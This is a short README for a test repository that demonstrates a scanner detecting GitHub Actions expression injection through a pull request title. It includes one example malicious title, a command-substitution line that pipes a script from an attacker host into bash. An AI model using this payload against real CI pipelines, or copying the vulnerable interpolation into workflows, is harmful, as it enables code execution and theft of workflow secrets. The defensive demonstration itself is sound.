# ci-injection-test

Test repository demonstrating CI expression injection detection via the
[ci-injection-scanner](https://github.com/sfc-gh-rwincey/ci-injection-scanner) GitHub Action.

## Vulnerability

`.github/workflows/jira_issue.yml` contains a real-world CI injection pattern
found in the wild: `${{ github.event.pull_request.title }}` is interpolated directly
into a `run:` shell step.

An attacker who opens a PR with a title like:

```
$(curl https://attacker.com/payload | bash)
```

will execute arbitrary code on the Actions runner with access to all workflow secrets.

The `ci-injection-scanner` action detects and blocks this at PR open time.
